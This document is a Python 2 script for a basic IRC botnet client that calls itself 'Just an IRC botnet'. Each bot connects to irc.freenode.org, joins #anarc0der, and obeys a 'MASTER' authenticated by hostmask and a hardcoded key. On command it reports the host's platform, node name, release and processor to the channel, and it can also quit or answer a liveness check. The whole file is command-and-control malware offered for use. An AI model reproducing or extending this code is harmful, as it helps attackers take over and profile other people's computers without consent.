import sys
import socket
import random
import platform

SERVER = "irc.freenode.org"
CHANNEL = "#anarc0der"
BOT_NICK = socket.gethostname() + str(random.randrange(1, 999))
PORT = 6667
MASTER = 0
MASTER_KEY = 'anarc0der'

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Connecting on the " + SERVER)
irc.connect((SERVER, PORT))
irc.send("USER " + BOT_NICK + " " + BOT_NICK + " " + BOT_NICK + " :Just "
         "an IRC botnet!\n")
irc.send("NICK " + BOT_NICK + "\n")
irc.send("JOIN " + CHANNEL + "\n")

while 1:
    text = irc.recv(2040)
    print(text)

    if text.find('PING') != -1:
        irc.send('PONG ' + text.split()[1] + '\r\n')

    # Authentication
    # To authenticate as owner, you need the master key and
    # a registered nick with unaffilated
    # To get the unaffilated, just ask for it in freenode help channel =)
    try:
        aut = text.split()[0].split('@')[1]
        pas = text.split()[-1]
        if 'unaffiliated/anarcoder' in aut and MASTER_KEY in pas:
            irc.send('PRIVMSG ' + CHANNEL + ' :Hello MASTER! \r\n')
            MASTER = 1
    except:
        pass

    # List of commands for authenticate botnet owner
    if MASTER == 1:

        if text.split()[-1] == BOT_NICK:

            if text.find('!help') != -1:
                cmds = {'!help': 'print this menu',
                        '!quit <bot>': 'quit bot',
                        '!info <bot>': 'show bot info',
                        '!hi <bot>': 'check if bot is alive'}
                irc.send('PRIVMSG ' + CHANNEL + ' :----------------------\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :simple irc botnet\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :comands:\r\n')
                for key, value in cmds.iteritems():
                    irc.send('PRIVMSG ' + CHANNEL + ' :' + key + ': ' + value +
                             '\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :----------------------\r\n')

            if text.find('!quit') != -1:
                irc.send('QUIT\r\n')
                sys.exit(1)

            if text.find('!info') != -1:
                cmds = ['platform', 'system', 'node', 'release', 'version',
                        'machine', 'processor']
                irc.send('PRIVMSG ' + CHANNEL + ' :----------------------\r\n')
                for c in cmds:
                    cmd = 'platform.{0}()'.format(c)
                    info = eval(cmd)
                    irc.send('PRIVMSG ' + CHANNEL + ' :' + c + ': ' + info +
                             '\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :----------------------\r\n')

            if text.find(':!hi') != -1:
                t = text.split(':!hi')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Hello MASTER, im here!\r\n')
